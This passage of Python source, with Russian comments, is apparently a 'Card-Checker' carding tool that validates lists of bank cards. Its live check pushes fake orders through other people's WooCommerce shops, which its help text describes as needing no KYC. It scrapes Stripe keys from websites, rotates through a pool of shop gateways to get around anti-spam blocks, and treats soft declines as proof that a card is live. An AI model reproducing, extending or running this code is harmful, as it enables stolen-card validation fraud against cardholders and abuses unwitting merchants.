                        variation_data = gw.get("_variation_data", [])
                        if variation_id:
                            add_payload["variation_id"] = variation_id
                            if variation_data:
                                add_payload["variation"] = variation_data
                        add_resp = client.post(
                            f"{gw_url}/wp-json/wc/store/v1/cart/add-item",
                            json=add_payload,
                            headers=add_headers,
                        )
                        new_nonce = add_resp.headers.get("nonce", "")
                        if not new_nonce:
                            new_nonce = add_resp.headers.get("X-WC-Store-API-Nonce", "") or add_resp.headers.get("Nonce", "")
                        if new_nonce:
                            nonce = new_nonce
                        print(f"    [WC] Add to cart: HTTP {add_resp.status_code}")
                    except Exception as e:
                        print(f"    [WC] Ошибка добавления в корзину: {e}")
                else:
                    print(f"    [WC] Товары не найдены, пробуем checkout без корзины")

                # Шаг 2.5: выбираем shipping rate (пробуем стандартные)
                shipping_rate_id = ""
                try:
                    for rid in ["flat_rate:1", "flat_rate:2", "free_shipping:1", "local_pickup:1"]:
                        sel_headers = {"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"}
                        if nonce:
                            sel_headers["Nonce"] = nonce
                        sel_resp = client.post(f"{gw_url}/wp-json/wc/store/v1/cart/select-shipping-rate",
                            json={"rate_id": rid}, headers=sel_headers)
                        if sel_resp.status_code == 200:
                            shipping_rate_id = rid
                            print(f"    [WC] Shipping rate найден: {rid}")
                            break
                    else:
                        print(f"    [WC] Стандартные shipping rates не подошли")
                except Exception as e:
                    print(f"    [WC] Ошибка получения shipping: {e}")

                # Шаг 2.7: обновляем customer (нужно для WC Stripe v9.7+ — billing address)
                try:
                    uc_headers = {"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"}
                    if nonce:
                        uc_headers["Nonce"] = nonce
                    uc_resp = client.post(f"{gw_url}/wp-json/wc/store/v1/cart/update-customer", json={
                        "billing_address": {
                            "first_name": "John", "last_name": "Doe", "address_1": "123 Main St",
                            "address_2": "", "city": "New York", "state": "NY", "postcode": "10001",
                            "country": "US", "email": checkout_email, "phone": "+12125551234",
                        },
                        "shipping_address": {
                            "first_name": "John", "last_name": "Doe", "address_1": "123 Main St",
                            "address_2": "", "city": "New York", "state": "NY", "postcode": "10001",
                            "country": "US",
                        },
                    }, headers=uc_headers)
                    new_nonce = uc_resp.headers.get("nonce", "") or uc_resp.headers.get("X-WC-Store-API-Nonce", "")
                    if new_nonce:
                        nonce = new_nonce
                except Exception as e:
                    print(f"    [WC] Ошибка update-customer: {e}")

                # Шаг 3: токенизация карты (после cart операций, чтобы не сбить сессию)
                print(f"    [WC] Токенизация через {pk_key[:20]}...")
                token_id, token_result = _stripe_tokenize_card(card, pk_key, timeout=timeout)
                print(f"    [WC] Токенизация: token_id={token_id}, status={token_result.status}, decline={token_result.decline_reason}")
                if not token_id:
                    if token_result.status in ("LIVE",):
                        token_result.gateway = "WooCommerce (Token)"
                        return token_result
                    # Если ошибка "integration surface" — пробуем следующий gateway
                    if "integration surface" in (token_result.error or "").lower():
                        print(f"    [WC] Gateway заблокирован для серверной токенизации, пробуем следующий...")
                        gw["status"] = "blocked"
                        _save_gateway_pool()
                        _update_gateway_stats(gw_url, False, error=True)
                        continue
                    # Если ошибка "testmode_charges_only" — шлюз в тестовом режиме, пробуем следующий
                    if "testmode_charges_only" in (token_result.decline_reason or "") or "testmode" in (token_result.error or "").lower():
                        print(f"    [WC] Шлюз в тестовом режиме (testmode_charges_only), пробуем следующий...")
                        gw["status"] = "blocked"
                        _save_gateway_pool()
                        _update_gateway_stats(gw_url, False, error=True)
                        continue
                    result.status = token_result.status
                    result.error = token_result.error or "Токенизация не удалась"
                    result.decline_reason = token_result.decline_reason
                    _update_gateway_stats(gw_url, False, error=True)
                    return result

                # Шаг 4: отправляем checkout
                checkout_headers = {
                    "User-Agent": UA,
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                }
                if nonce:
                    checkout_headers["Nonce"] = nonce

                billing = {
                    "first_name": "John",
                    "last_name": "Doe",
                    "address_1": "123 Main St",
                    "address_2": "",
                    "city": "New York",
                    "state": "NY",
                    "postcode": "10001",
                    "country": "US",
                    "email": checkout_email,
                    "phone": "+12125551234",
                }

                shipping = {
                    "first_name": "John",
                    "last_name": "Doe",
                    "address_1": "123 Main St",
                    "address_2": "",
                    "city": "New York",
                    "state": "NY",
                    "postcode": "10001",
                    "country": "US",
                }

                checkout_body = {
                    "billing_address": billing,
                    "shipping_address": shipping,
                    "payment_method": "stripe",
                    "payment_data": [
                        {"key": "payment_method", "value": token_id},
                        {"key": "stripe_payment_method", "value": token_id},
                        {"key": "billing_email", "value": checkout_email},
                        {"key": "billing_first_name", "value": "John"},
                        {"key": "billing_last_name", "value": "Doe"},
                        {"key": "billing_address->line1", "value": "123 Main St"},
                        {"key": "billing_address->city", "value": "New York"},
                        {"key": "billing_address->state", "value": "NY"},
                        {"key": "billing_address->postal_code", "value": "10001"},
                        {"key": "billing_address->country", "value": "US"},
                        {"key": "billing_phone", "value": "+12125551234"},
                    ],
                }
                if shipping_rate_id:
                    checkout_body["shipping_rates"] = [{"rate_id": shipping_rate_id}]
                else:
                    # Fallback: пробуем стандартные rate_id прямо в checkout
                    checkout_body["shipping_rates"] = [
                        {"rate_id": "flat_rate:1"},
                        {"rate_id": "free_shipping:1"},
                    ]

                print(f"    [WC] POST /checkout → {gw_url}/wp-json/wc/store/v1/checkout")
                # Retry checkout до 3 раз (WC Stripe v9.7+ баг: "Missing required customer field" на первой попытке)
                for checkout_attempt in range(3):
                    resp = client.post(
                        f"{gw_url}/wp-json/wc/store/v1/checkout",
                        json=checkout_body,
                        headers=checkout_headers,
                    )
                    print(f"    [WC] Checkout response: HTTP {resp.status_code} (attempt {checkout_attempt+1}/3)")
                    # Проверяем если ошибка "Missing required customer field" — retry
                    if resp.status_code in (400, 500):
                        try:
                            err_data = resp.json()
                            err_msg = err_data.get("message", "") or ""
                            details = err_data.get("payment_result", {}).get("payment_details", [])
                            for d in details:
                                if "Missing required customer field" in (d.get("value", "") or ""):
                                    err_msg = d["value"]
                            if "Missing required customer field" in err_msg:
                                print(f"    [WC] WC Stripe v9.7+ баг: {err_msg}, retry...")
                                # Обновляем nonce перед retry
                                try:
                                    cart_r = client.get(f"{gw_url}/wp-json/wc/store/v1/cart", headers={"User-Agent": UA, "Accept": "application/json"})
                                    new_n = cart_r.headers.get("nonce", "") or cart_r.headers.get("X-WC-Store-API-Nonce", "")
                                    if new_n:
                                        nonce = new_n
                                        checkout_headers["Nonce"] = nonce
                                except:
                                    pass
                                continue
                        except:
                            pass
                    break  # Не ошибка billing — выходим из retry loop

                result.raw_response = {"status_code": resp.status_code}
                try:
                    data = resp.json()
                    result.raw_response = data
                    print(f"    [WC] Response keys: {list(data.keys())[:10]}")
                    if "payment_result" in data:
                        pr = data["payment_result"]
                        print(f"    [WC] payment_status={pr.get('payment_status')}, redirect={pr.get('redirect_url','')[:50]}")
                    if "code" in data:
                        print(f"    [WC] error code={data['code']}, msg={data.get('message','')[:100]}")
                except Exception:
                    data = {}
                    print(f"    [WC] Response not JSON: {resp.text[:200]}")

                # Проверяем payment_result в любом статус-коде (WC может вернуть 400 с payment_result)
                payment_result = data.get("payment_result", {})
                payment_status = payment_result.get("payment_status", "")

                if payment_status == "success":
                    result.status = "LIVE"
                    result.auth_code = str(data.get("order_id", ""))
                    _update_gateway_stats(gw_url, True)
                elif payment_status in ("failed", "failure"):
                    details = payment_result.get("payment_details", [])
                    redirect_url = payment_result.get("redirect_url", "")
                    decline_msg = ""
                    decline_code = ""
                    error_message = ""
                    for d in details:
                        k = d.get("key", "")
                        v = d.get("value", "")
                        if k == "errorMessage":
                            error_message = v
                        elif k == "result":
                            decline_code = v
                        elif k and not decline_msg:
                            decline_msg = v
                    # Если errorMessage найден — это главный decline reason
                    if error_message:
                        decline_msg = error_message
                    # Логируем полный payment_result для анализа
                    print(f"    [WC] Decline: code={decline_code}, msg={decline_msg}")
                    print(f"    [WC] payment_details: {json.dumps(details)[:300]}")
                    if redirect_url:
                        print(f"    [WC] redirect_url: {redirect_url[:200]}")
                    # Верdict: LIVE только если оплата прошла (success) или
                    # известная "мягкая" причина (подтверждает валидность карты)
                    if decline_code in ("insufficient_funds", "card_insufficient_funds"):
                        result.status = "LIVE"
                        result.decline_reason = "insufficient_funds"
                    elif decline_code in ("incorrect_cvc", "incorrect_cvv"):
                        result.status = "LIVE"
                        result.decline_reason = "incorrect_cvc"
                    elif decline_code in ("authentication_required", "requires_authentication"):
                        result.status = "LIVE"
                        result.decline_reason = "3ds_required"
                    elif "insufficient" in (decline_msg or "").lower():
                        result.status = "LIVE"
                        result.decline_reason = "insufficient_funds"
                    elif "3d" in (decline_msg or "").lower() or "authentication" in (decline_msg or "").lower():
                        result.status = "LIVE"
                        result.decline_reason = "3ds_required"
                    elif redirect_url and ("stripe.com" in redirect_url or "3d" in redirect_url.lower() or "authenticate" in redirect_url.lower()):
                        # Redirect на Stripe 3DS — карта живая, требует верификацию
                        result.status = "LIVE"
                        result.decline_reason = "3ds_required"
                    elif decline_code in ("card_declined", "do_not_honor", "generic_decline"):
                        result.status = "DEAD"
                        result.decline_reason = decline_code
                    elif "declined" in (decline_msg or "").lower() or "do not honor" in (decline_msg or "").lower():
                        result.status = "DEAD"
                        result.decline_reason = decline_code or "card_declined"
                    elif not decline_code and not decline_msg:
                        # Пустой decline — карта токенизирована, но причина отказа неизвестна
                        # Нельзя утверждать что LIVE — ставим UNKNOWN
                        result.status = "UNKNOWN"
                        result.decline_reason = "tokenized_but_declined_unknown"
                    elif "Missing required customer field" in (decline_msg or ""):
                        # WC Stripe v9.7+ баг — billing address не подставился в customer
                        # Карта токенизирована Stripe (PM создан), но checkout упал из-за бага плагина
                        result.status = "UNKNOWN"
                        result.decline_reason = "wc_stripe_billing_bug"
                    elif token_id and token_result.raw_response.get("_3ds_supported") and "processing failed" in (decline_msg or "").lower():
                        # PM создан + карта поддерживает 3DS + "Payment processing failed"
                        # WC Store API не может обработать 3DS — но это может быть и реальный decline
                        # Нельзя точно сказать LIVE или DEAD — ставим UNKNOWN
                        result.status = "UNKNOWN"
                        result.decline_reason = "3ds_or_declined"
                    elif token_id and "processing failed" in (decline_msg or "").lower():
                        # PM создан + processing failed — карта скорее всего живая,
                        # но без 3DS info не можем быть уверены
                        result.status = "UNKNOWN"
                        result.decline_reason = "tokenized_but_payment_failed"
                    else:
                        result.status = "DEAD"
                        result.decline_reason = decline_code or decline_msg or "payment_failed"
                    result.error = decline_msg
                    _update_gateway_stats(gw_url, result.status == "LIVE")
                elif resp.status_code in (200, 201) and not payment_status:
                    result.status = "UNKNOWN"
                    result.error = f"payment_status пустой, HTTP {resp.status_code}"
                    _update_gateway_stats(gw_url, False, error=True)
                elif resp.status_code == 400:
                    err_data = data
                    code = err_data.get("code", "")
                    msg = err_data.get("message", "")
                    if "nonce" in msg.lower() or code == "woocommerce_rest_missing_nonce":
                        result.status = "ERROR"
                        result.error = "Сайт требует nonce (не удалось получить)"
                        gw["status"] = "cooldown"
                        _save_gateway_pool()
                    elif "woocommerce_rest_cannot_view" in code:
                        result.status = "ERROR"
                        result.error = "Сайт защищён (недоступен Store API)"
                        gw["status"] = "cooldown"
                        _save_gateway_pool()
                    else:
                        result.status = "ERROR"
                        result.error = msg or f"HTTP 400: {json.dumps(data)[:200]}"
                    _update_gateway_stats(gw_url, False, error=True)
                elif resp.status_code in (403, 404):
                    # Проверяем если это антиспам (CleanTalk и т.д.)
                    try:
                        err_body = resp.json()
                        err_msg = err_body.get("message", "") or json.dumps(err_body)[:200]
                    except:
                        err_msg = ""
                    if "blacklist" in err_msg.lower() or "antispam" in err_msg.lower() or "cleantalk" in err_msg.lower() or "spam" in err_msg.lower():
                        print(f"    [WC] Checkout заблокирован антиспамом: {err_msg[:80]}")
                        print(f"    [WC] Пробуем следующий gateway...")
                        gw["status"] = "cooldown"
                        _save_gateway_pool()
                        _update_gateway_stats(gw_url, False, error=True)
                        continue
                    result.status = "ERROR"
                    result.error = f"Store API недоступен (HTTP {resp.status_code})"
                    gw["status"] = "cooldown"
                    _save_gateway_pool()
                    _update_gateway_stats(gw_url, False, error=True)
                else:
                    result.status = "ERROR"
                    result.error = f"HTTP {resp.status_code}: {json.dumps(data)[:200]}"
                    _update_gateway_stats(gw_url, False, error=True)

                # Если получили результат — сохраняем пул и возвращаем
                _save_gateway_pool()
                return result

        except httpx.TimeoutException:
            result.status = "ERROR"
            result.error = f"Таймаут при проверке через {gw_url}"
            _update_gateway_stats(gw_url, False, error=True)
            continue
        except Exception as exc:
            result.status = "ERROR"
            result.error = f"Ошибка: {exc}"
            _update_gateway_stats(gw_url, False, error=True)
            continue

    # Все попытки исчерпаны
    if not result.status or result.status == "":
        result.status = "ERROR"
        result.error = "Все gateway заблокированы для серверной токенизации"
    return result


# ─────────────────────────────────────────────
# Полная проверка карты
# ─────────────────────────────────────────────

@dataclass
class CardCheckResult:
    """Полный результат проверки карты."""
    card: CardData = field(default_factory=CardData)
    # Level 1: Luhn
    luhn_valid: bool = False
    # Level 2: Brand & length
    brand: str = ""
    length_valid: bool = False
    # Level 3: Expiry & CVV
    expired: bool = False
    cvv_status: str = ""
    # Level 4: BIN
    bin_info: BINInfo = field(default_factory=BINInfo)
    # Level 5: Live check
    live_result: LiveCheckResult = field(default_factory=LiveCheckResult)
    # Summary
    overall_verdict: str = ""
    overall_score: int = 0

    def to_dict(self) -> dict:
        d: dict = {
            "pan_masked": _mask_pan(self.card.pan),
            "brand": self.brand,
            "luhn_valid": self.luhn_valid,
            "length_valid": self.length_valid,
            "expired": self.expired,
            "cvv_status": self.cvv_status,
            "overall_verdict": self.overall_verdict,
            "overall_score": self.overall_score,
        }
        if self.bin_info.bin_code:
            d["bin"] = self.bin_info.to_dict()
        if self.live_result.status:
            d["live_check"] = self.live_result.to_dict()
        return d


def _mask_pan(pan: str) -> str:
    """Маскирует PAN: 453957******1234"""
    if len(pan) < 8:
        return pan
    return pan[:6] + "*" * (len(pan) - 10) + pan[-4:]


def check_card(
    card_line: str,
    *,
    stripe_key: str = "",
    site_url: str = "",
    timeout: float = 20.0,
    skip_live: bool = False,
    wc_mode: bool = False,
) -> CardCheckResult:
    """Полная проверка карты по всем уровням."""

    card = parse_card(card_line)
    result = CardCheckResult(card=card)

    if not card.pan:
        result.overall_verdict = "ОШИБКА"
        result.overall_score = 0
        return result

    # ── Level 1: Luhn ──
    result.luhn_valid = luhn_check(card.pan)

    # ── Level 2: Brand & length ──
    result.brand = detect_card_brand(card.pan)
    result.length_valid = validate_card_length(card.pan)

    # ── Level 3: Expiry & CVV ──
    result.expired = is_expired(card.month, card.year)
    result.cvv_status = validate_cvv(result.brand, card.cvv)

    # ── Level 4: BIN Lookup ──
    bin_code = card.pan[:8]
    if len(bin_code) >= 6:
        result.bin_info = lookup_bin(bin_code[:6], timeout=timeout)

    # ── Level 5: Live Check ──
    if not skip_live and card.cvv and card.month and card.year:
        # WooCommerce mode — без KYC, через чужие магазины
        if wc_mode:
            result.live_result = _wc_check_card(card, timeout=timeout)
        else:
            pk = stripe_key

            # Если ключ не указан — пробуем загрузить из .env
            if not pk:
                pk_from_env = _load_env_key("STRIPE_PUBLISHABLE_KEY")
                rk_from_env = _load_env_key("STRIPE_RESTRICTED_KEY")
                sk_from_env = _load_env_key("STRIPE_SECRET_KEY")
                if pk_from_env and rk_from_env:
                    pk = pk_from_env
                    stripe_key = rk_from_env  # будет использован как rk
                elif pk_from_env:
                    pk = pk_from_env
                elif rk_from_env:
                    pk = rk_from_env
                elif sk_from_env:
                    pk = sk_from_env

            # Если ключ не указан, но указан сайт — ищем ключ на сайте
            if not pk and site_url:
                pk = _find_stripe_key_on_site(site_url, timeout=timeout)

            if pk:
                # Определяем тип ключа и используем соответствующий метод
                if pk.startswith("sk_") or pk.startswith("rk_"):
                    # Secret/Restricted key — пробуем два способа:
                    # 1. Если есть pk в .env — двухшаговая схема
                    # 2. Иначе — прямая токенизация через rk (требует прав)
                    pk_from_env = _load_env_key("STRIPE_PUBLISHABLE_KEY")
                    if pk_from_env:
                        live = _stripe_live_check(
                            card, pk_from_env, pk, timeout=timeout,
                        )
                    else:
                        # Пробуем токенизацию через rk напрямую
                        live = _stripe_tokenize_card(card, pk, timeout=timeout)[1]
                        # Если токенизация не сработала — пробуем SetupIntent напрямую
                        if live.status in ("DEAD", "ERROR"):
                            live2 = _stripe_create_setup_intent_direct(
                                card, pk, timeout=timeout,
                            )
                            if live2.status not in ("ERROR",):
                                live = live2
                elif pk.startswith("pk_"):
                    # Publishable key — нужен restricted key для SetupIntent
                    rk_from_env = _load_env_key("STRIPE_RESTRICTED_KEY")
                    if rk_from_env:
                        live = _stripe_live_check(
                            card, pk, rk_from_env, timeout=timeout,
                        )
                    else:
                        # Только pk — токенизация (частичная проверка)
                        live = _stripe_tokenize_card(card, pk, timeout=timeout)[1]
                else:
                    live = LiveCheckResult(
                        status="ERROR",
                        error="Неизвестный тип Stripe ключа",
                    )

                result.live_result = live
            else:
                result.live_result = LiveCheckResult(
                    status="SKIPPED",
                    error="Stripe ключ не найден. Укажите --key или --site",
                )

    # ── Compute overall verdict ──
    result.overall_score, result.overall_verdict = _compute_verdict(result)

    return result


def _compute_verdict(r: CardCheckResult) -> tuple[int, str]:
    """Вычисляет общий скор и вердикт."""
    score = 0

    # Luhn
    if r.luhn_valid:
        score += 25
    else:
        return 0, "МЁРТВАЯ (невалидный номер — Luhn fail)"

    # Brand & length
    if r.brand != "UNKNOWN":
        score += 10
    if r.length_valid:
        score += 10

    # Expiry
    if r.card.month and r.card.year:
        if r.expired:
            return 5, "МЁРТВАЯ (срок действия истёк)"
        score += 15
    else:
        score += 5  # неизвестно

    # CVV
    if r.cvv_status == "OK":
        score += 10
    elif r.cvv_status.startswith("CVV не указан"):
        score += 0

    # BIN info
    if r.bin_info.bank_name:
        score += 5
    if r.bin_info.card_type in ("CREDIT", "DEBIT"):
        score += 5

    # Live check
    live = r.live_result
    if live.status == "LIVE":
        score += 25
        if live.decline_reason == "test_card":
            return min(score, 100), "ЖИВАЯ (тестовая карта Stripe — проверка через тестовый токен)"
        elif live.decline_reason == "insufficient_funds":
            return min(score, 90), "ЖИВАЯ (нет средств — insufficient_funds)"
        elif live.decline_reason == "incorrect_cvc":
            return min(score, 85), "ЖИВАЯ (неверный CVV — карта существует)"
        elif live.decline_reason == "3ds_required":
            return min(score, 85), "ЖИВАЯ (требует 3DS верификацию)"
        return min(score, 100), "ЖИВАЯ"
    elif live.status == "DEAD":
        reason = live.decline_reason or live.error or "отклонена"
        return max(score - 20, 10), f"МЁРТВАЯ ({reason})"
    elif live.status == "ERROR":
        reason = live.error or "ошибка при проверке"
        if score >= 50:
            return score, f"НЕПРОВЕРЕННАЯ (Luhn/срок/CVV/BIN ок, live-check ошибка: {reason})"
        return score, f"ВЕРОЯТНО МЁРТВАЯ ({reason})"
    elif live.status == "SKIPPED":
        # Без live-check — только формальная проверка
        if score >= 50:
            return score, "НЕПРОВЕРЕННАЯ (Luhn/срок/CVV/BIN ок, live-check не проводился)"
        return score, "ВЕРОЯТНО МЁРТВАЯ"
    elif live.status == "UNKNOWN":
        if live.decline_reason == "tokenized_but_declined_unknown":
            reason = "Stripe токенизация ок (номер/срок/CVV валидны), платёж отклонён без причины"
        elif live.decline_reason == "wc_stripe_billing_bug":
            reason = "Stripe токенизация ок (номер/срок/CVV валидны), checkout не завершён (баг WC Stripe v9.7+)"
        elif live.decline_reason == "3ds_or_declined":
            reason = "Stripe токенизация ок (номер/срок/CVV валидны), платёж отклонён — возможно 3DS или реальный decline"
        elif live.decline_reason == "tokenized_but_payment_failed":
            reason = "Stripe токенизация ок (номер/срок/CVV валидны), платёж отклонён (Payment processing failed)"
        else:
            reason = live.error or "неизвестный результат"
        if score >= 50:
            return score, f"ВЕРОЯТНО ЖИВАЯ ({reason})"
        return score, f"ВЕРОЯТНО МЁРТВАЯ ({reason})"

    # Если нет live check данных
    if score >= 50:
        return score, "НЕПРОВЕРЕННАЯ (Luhn/срок/CVV/BIN ок, live-check не проводился)"
    return score, "ВЕРОЯТНО МЁРТВАЯ"


# ─────────────────────────────────────────────
# Форматированный вывод
# ─────────────────────────────────────────────

def format_card_report(r: CardCheckResult) -> str:
    """Человекочитаемый отчёт проверки карты."""
    lines: list[str] = []
    hr = "═" * 60

    lines.append(hr)
    lines.append("  CARD-CHECKER — Проверка банковской карты")
    lines.append(hr)

    # Маскированный PAN
    lines.append(f"  Номер      : {_mask_pan(r.card.pan)}")
    if r.card.month and r.card.year:
        lines.append(f"  Срок       : {r.card.month}/{r.card.year}")
    if r.card.cvv:
        lines.append(f"  CVV        : {'*' * len(r.card.cvv)}")

    lines.append("")
    lines.append("  ── УРОВЕНЬ 1: Алгоритм Луна ──")
    if r.luhn_valid:
        lines.append("  ✓ ПРОЙДЕН — номер валиден по Luhn")
    else:
        lines.append("  ✗ НЕ ПРОЙДЕН — номер невалиден!")

    lines.append("")
    lines.append("  ── УРОВЕНЬ 2: Тип карты ──")
    lines.append(f"  Платёжная сеть : {r.brand}")
    if r.length_valid:
        lines.append("  ✓ Длина номера корректна")
    else:
        lines.append("  ✗ Длина номера некорректна для данного типа")

    lines.append("")
    lines.append("  ── УРОВЕНЬ 3: Срок & CVV ──")
    if r.card.month and r.card.year:
        if r.expired:
            lines.append("  ✗ КАРТА ИСТЕКЛА")
        else:
            lines.append("  ✓ Срок действия действителен")
    else:
        lines.append("  ○ Срок действия не указан")
    lines.append(f"  CVV: {r.cvv_status}")

    lines.append("")
    lines.append("  ── УРОВЕНЬ 4: BIN Lookup ──")
    if r.bin_info.error:
        lines.append(f"  ○ {r.bin_info.error}")
    elif r.bin_info.bin_code:
        lines.append(f"  BIN         : {r.bin_info.bin_code}")
        if r.bin_info.scheme:
            lines.append(f"  Сеть        : {r.bin_info.scheme}")
        if r.bin_info.card_type:
            lines.append(f"  Тип         : {r.bin_info.card_type}")
        if r.bin_info.brand:
            lines.append(f"  Уровень     : {r.bin_info.brand}")
        if r.bin_info.bank_name:
            lines.append(f"  Банк        : {r.bin_info.bank_name}")
        if r.bin_info.country:
            lines.append(f"  Страна      : {r.bin_info.country} ({r.bin_info.country_code})")
        if r.bin_info.prepaid:
            lines.append(f"  Prepaid     : {r.bin_info.prepaid}")
        if r.bin_info.source:
            lines.append(f"  Источник    : {r.bin_info.source}")
    else:
        lines.append("  ○ BIN слишком короткий")

    lines.append("")
    lines.append("  ── УРОВЕНЬ 5: Live-проверка ──")
    live = r.live_result
    if live.status == "LIVE":
        lines.append("  ✓ КАРТА ЖИВАЯ")
        if live.decline_reason:
            lines.append(f"  ⚠ Причина: {live.decline_reason}")
        if live.gateway:
            lines.append(f"  Шлюз: {live.gateway}")
        if live.card_fingerprint:
            lines.append(f"  Fingerprint: {live.card_fingerprint}")
    elif live.status == "DEAD":
        lines.append("  ✗ КАРТА МЁРТВАЯ")
        if live.decline_reason:
            lines.append(f"  Причина: {live.decline_reason}")
        if live.error:
            lines.append(f"  Сообщение: {live.error}")
        if live.gateway:
            lines.append(f"  Шлюз: {live.gateway}")
    elif live.status == "UNKNOWN":
        lines.append("  ○ Результат неопределён")
        if live.decline_reason:
            lines.append(f"  Причина: {live.decline_reason}")
        # Подробное объяснение для UNKNOWN
        if live.decline_reason == "tokenized_but_declined_unknown":
            lines.append("  Основание: карта успешно токенизирована Stripe (номер/срок/CVV валидны),")
            lines.append("  но платёж отклонён без указания причины. Это может быть:")
            lines.append("  — требуется 3DS верификация")
            lines.append("  — недостаточно средств")
            lines.append("  — карта ограничена для онлайн-платежей")
            lines.append("  — эмитент отклонил без объяснения")
        elif live.decline_reason == "wc_stripe_billing_bug":
            lines.append("  Основание: карта успешно токенизирована Stripe (номер/срок/CVV валидны),")
            lines.append("  но checkout не завершён из-за бага WC Stripe v9.7+")
            lines.append("  (Missing required customer field: address->line1)")
            lines.append("  Это баг плагина, не проблема карты. Карта вероятно ЖИВАЯ.")
        if live.gateway:
            lines.append(f"  Шлюз: {live.gateway}")
    elif live.status == "SKIPPED":
        lines.append(f"  ○ Пропущен: {live.error}")
    elif live.status == "ERROR":
        lines.append(f"  ✗ Ошибка: {live.error}")
    else:
        lines.append("  ○ Live-check не проводился")

    # ── Итог ──
    lines.append("")
    lines.append(hr)

    # Цветной вердикт (ANSI)
    if r.overall_verdict.startswith("ЖИВАЯ"):
        marker = "✓"
    elif r.overall_verdict.startswith("МЁРТВАЯ"):
        marker = "✗"
    else:
        marker = "○"

    lines.append(f"  {marker} ВЕРДИКТ: {r.overall_verdict}")
    lines.append(f"  СКОР: {r.overall_score} / 100")
    lines.append(hr)

    return "\n".join(lines)


# ─────────────────────────────────────────────
# Batch-проверка
# ─────────────────────────────────────────────

def batch_check(
    card_lines: list[str],
    *,
    stripe_key: str = "",
    site_url: str = "",
    timeout: float = 20.0,
    skip_live: bool = False,
    wc_mode: bool = False,
) -> list[CardCheckResult]:
    """Проверяет список карт."""
    results: list[CardCheckResult] = []
    bin_cache: dict[str, BINInfo] = {}

    for i, line in enumerate(card_lines):
        card = parse_card(line)
        if not card.pan:
            continue

        # Кэшируем BIN lookup
        bin_key = card.pan[:6]
        if bin_key in bin_cache:
            # Создаём результат вручную с кэшированным BIN
            r = CardCheckResult(card=card)
            r.luhn_valid = luhn_check(card.pan)
            r.brand = detect_card_brand(card.pan)
            r.length_valid = validate_card_length(card.pan)
            r.expired = is_expired(card.month, card.year)
            r.cvv_status = validate_cvv(r.brand, card.cvv)
            r.bin_info = bin_cache[bin_key]
        else:
            r = check_card(
                line,
                stripe_key=stripe_key,
                site_url=site_url if i == 0 else "",  # ключ ищем один раз
                timeout=timeout,
                skip_live=True,  # сначала без live
            )
            if r.bin_info.bin_code:
                bin_cache[bin_key] = r.bin_info

        results.append(r)

    # Live-check для всех карт
    if not skip_live:
        if wc_mode:
            # WooCommerce mode — каждая карта через свой gateway
            for r in results:
                card = r.card
                if card.cvv and card.month and card.year:
                    live = _wc_check_card(card, timeout=timeout)
                    r.live_result = live
                    r.overall_score, r.overall_verdict = _compute_verdict(r)
                    time.sleep(1.0)  # rate limit между картами
        elif stripe_key or site_url:
            key = stripe_key
            if not key and site_url:
                key = _find_stripe_key_on_site(site_url, timeout=timeout)

            if key:
                # Определяем pk и rk
                if key.startswith("pk_"):
                    pk_key = key
                    rk_key = _load_env_key("STRIPE_RESTRICTED_KEY")
                elif key.startswith("sk_") or key.startswith("rk_"):
                    pk_key = _load_env_key("STRIPE_PUBLISHABLE_KEY")
                    rk_key = key
                else:
                    pk_key = key
                    rk_key = ""

                for r in results:
                    card = r.card
                    if card.cvv and card.month and card.year:
                        if pk_key and rk_key:
                            live = _stripe_live_check(
                                card, pk_key, rk_key, timeout=timeout,
                            )
                        elif pk_key:
                            live = _stripe_tokenize_card(card, pk_key, timeout=timeout)[1]
                        else:
                            live = LiveCheckResult(
                                status="ERROR",
                                error="Нет publishable key для токенизации",
                            )
                        r.live_result = live
                        r.overall_score, r.overall_verdict = _compute_verdict(r)
                        time.sleep(0.5)  # rate limit

    return results


def format_batch_report(results: list[CardCheckResult]) -> str:
    """Краткий отчёт по batch-проверке."""
    lines: list[str] = []
    hr = "═" * 60

    lines.append(hr)
    lines.append(f"  BATCH-CHECK — Проверено карт: {len(results)}")
    lines.append(hr)

    live_count = sum(1 for r in results if r.overall_verdict.startswith("ЖИВАЯ"))
    dead_count = sum(1 for r in results if r.overall_verdict.startswith("МЁРТВАЯ"))
    formal_count = sum(1 for r in results if "ФОРМАЛЬНО" in r.overall_verdict)
    unknown_count = len(results) - live_count - dead_count - formal_count

    lines.append("")
    for r in results:
        marker = "✓" if r.overall_verdict.startswith("ЖИВАЯ") else (
            "✗" if r.overall_verdict.startswith("МЁРТВАЯ") else "○")
        pan_masked = _mask_pan(r.card.pan)
        lines.append(
            f"  {marker} {pan_masked}  [{r.brand}]  "
            f"{r.overall_score}/100  {r.overall_verdict}"
        )

    lines.append("")
    lines.append(hr)
    lines.append(f"  ИТОГО: {len(results)} карт")
    lines.append(f"    ✓ Живых: {live_count}")
    lines.append(f"    ✗ Мёртвых: {dead_count}")
    lines.append(f"    ○ Формально валидных: {formal_count}")
    lines.append(f"    ? Неизвестно: {unknown_count}")
    lines.append(hr)

    return "\n".join(lines)


# ─────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(
        description="Card-Checker: проверка банковских карт на «живость»",
    )
    parser.add_argument(
        "card", nargs="?", default=None,
        help="Номер карты (PAN|MM|YYYY|CVV или просто PAN)",
    )
    parser.add_argument(
        "--batch", type=str, default=None,
        help="Файл со списком карт (по одной на строку)",
    )
    parser.add_argument(
        "--key", type=str, default=None,
        help="Stripe publishable key (pk_live_... или pk_test_...)",
    )
    parser.add_argument(
        "--site", type=str, default=None,
        help="URL сайта для поиска Stripe ключа (автоматически)",
    )
    parser.add_argument(
        "--no-live", action="store_true",
        help="Пропустить live-check (только Luhn + BIN)",
    )
    parser.add_argument(
        "--json", action="store_true", dest="json_output",
        help="Вывести результат в формате JSON",
    )
    parser.add_argument(
        "--timeout", type=float, default=20.0,
        help="Таймаут HTTP-запроса (секунды)",
    )
    parser.add_argument(
        "--find-key", type=str, default=None, metavar="URL",
        help="Найти Stripe publishable key на сайте и вывести",
    )
    parser.add_argument(
        "--wc", action="store_true", dest="wc_mode",
        help="WooCommerce-режим: проверка через чужие магазины (без KYC)",
    )
    args = parser.parse_args()

    # ── Режим поиска ключа ──
    if args.find_key:
        print(f"Поиск Stripe ключа на {args.find_key}...")
        pk = _find_stripe_key_on_site(args.find_key, timeout=args.timeout)
        if pk:
            print(f"Найден ключ: {pk}")
        else:
            print("Ключ не найден на указанном сайте.")
        sys.exit(0 if pk else 1)

